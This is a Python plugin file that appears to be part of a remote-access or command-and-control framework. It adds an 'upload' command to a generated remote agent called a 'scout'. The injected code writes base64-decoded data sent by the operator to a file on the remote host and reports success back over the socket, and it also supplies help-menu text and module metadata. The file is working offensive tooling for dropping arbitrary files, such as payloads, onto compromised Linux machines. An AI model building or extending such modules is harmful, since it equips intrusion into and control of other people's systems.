# API
# done


def main(self, option):
    if option == 'generate':
        self.config.import_statements.append('from base64 import b64decode')
        self.config.functions.append('''
def upload(data):
    data = data.split(' ')
    filename = ' '.join(data[1:-1])
    f = open(filename,'wb')
    f.write(b64decode(data[-1]))
    send_all(s,'[+]Successfully wrote uploaded file data')''')
        self.config.logics.append('''
            elif command == "upload":
                upload(data)''')
        self.config.help_menu['upload <Local file path>'] = 'Remotely upload a file to remote current working directory of scout'
    elif option == 'info':
        self.log.blank('\nName             : Upload File component' \
                       '\nOS               : Linux' \
                       '\nRequired Modules : base64' \
                       '\nCommands         : upload <Local file path>' \
                       '\nDescription      : Remotely upload a file to remote current working directory of scout, utilizes base64 to encode binary data\n')
        return {
                "Name": "Upload File component",
                "OS": "Linux",
                "Required Modules": "base64",
                "Commands": "upload <Local file path>",
                "Description": "Remotely upload a file to remote current working directory of scout, utilizes base64 to encode binary data"
            }